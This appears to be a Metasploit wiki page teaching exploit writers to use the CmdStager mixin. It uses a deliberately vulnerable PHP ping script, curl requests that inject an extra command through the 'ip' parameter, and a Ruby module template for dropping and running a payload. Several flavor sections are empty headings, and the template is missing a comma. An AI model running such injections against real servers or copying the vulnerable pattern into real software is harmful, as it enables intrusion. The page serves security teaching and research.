Command stagers provide an easy way to write exploits against typical vulnerabilities such as [command execution](https://www.owasp.org/index.php/Command_Injection) or [code injection](https://www.owasp.org/index.php/Code_Injection). There are currently eight different flavors of command stagers, each uses some sort of system command to save your payload onto the target machine, and execute it.

# The Vulnerability to Play with

The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in PHP, something silly you actually might see in an enterprise-level software. The bug is that you can inject additional system commands in the system call for ping:

```php
<?php
   if ( isset($_GET["ip"]) ) {
      $output = system("ping -c 1 " . $_GET["ip"]);
      die($output);
   }
?>

<html>
<body>
  <form action = "ping.php" method = "GET">
   IP to ping: <input type = "text" name = "ip" /> <input type = "submit" />
  </form>
   </body>
</html>
```

Place the above PHP script (ping.php) on an [Ubuntu + Apache + PHP](https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-14-04) server.

Under normal usage, this is how the script behaves - it just pings the host you specify, and shows
you the output:

```
$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
```

OK, now we can abuse that a little and execute another command (id):

```
$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

See the www-data? That is the output for the second command we asked the script to execute. By doing that, we can also do something even more nasty - like writing a Meterpreter payload onto the target system, and execute it.


# The Msf::Exploit::CmdStager Mixin

Now let's talk about how to use a command stager to exploit the above script. There are a couple of steps you need to do:

**1. Include the Msf::Exploit::CmdStager mixin**

Although there are eight flavors of mixins/stagers, you only need to include [Msf::Exploit::CmdStager](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmdstager.rb) when writing a Metasploit exploit. The mixin is basically an interface to all eight command stagers:

```ruby
include Msf::Exploit::CmdStager
```

**2. Declare your flavors**

To tell Msf::Exploit::CmdStager what flavors you want, you can add the ```CmdStagerFlavor``` info in the module's metadata. Either from the common level, or the target level. Or, you can pass this info to the #execute_cmdstager
method (see Call #execute_cmdstager to begin)

```ruby
execute_cmdstager(flavor: :vbs)
```

**3. Create the execute_command method**

You also must create a ```def execute_command(cmd, opts = {})``` method in your module. This is what gets called by the CmdStager mixin when it kicks in. Your objective in this method is to inject whatever is in the ```cmd``` variable to the vulnerable code.

**4. Call #execute_cmdstager to begin**

And lastly, in your exploit method, call ```execute_cmdstager``` to begin the command stager.

flavor
decoder
delay
linemax

**Msf::Exploit::CmdStager Template**

At the minimum, this is how your exploit should start when you're using the CmdStager mixin:

```ruby
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'            => "Ping Command Injection Vulnerability Demo",
      'Description'     => %q{
        This exploits a command injection in our ping.php demo script.
      },
      'License'         => MSF_LICENSE,
      'Author'          => [ 'sinn3r' ],
      'References'      => [ [ 'URL', 'http://metasploit.com' ] ],
      'Platform'        => 'linux',
      'Targets'         => [ [ 'Linux', {} ] ],
      'Payload'         => { 'BadChars' => "\x00" },
      'CmdStagerFlavor' => [ 'echo' ]
      'Privileged'      => false,
      'DisclosureDate'  => "Jun 10 2016",
      'DefaultTarget'   => 0))
  end

  def execute_command(cmd, opts = {})
    # calls some method to inject cmd to the vulnerable code.
  end

  def exploit
    print_status("Exploiting...")
    execute_cmdstager
  end

end
```

As you can see, we have chosen the "echo" flavor as our command stager. We will explain more about
this later, but basically what it does is it writes our payload to /tmp and execute it.



# Flavors

## VBS Command Stager

## Certutil Command Stager

## Debug_write Command Stager

## Debug_asm Command Stager

## TFTP Command Stager

## Bourne Command Stager

## Echo Command Stager

## Printf Command Stager
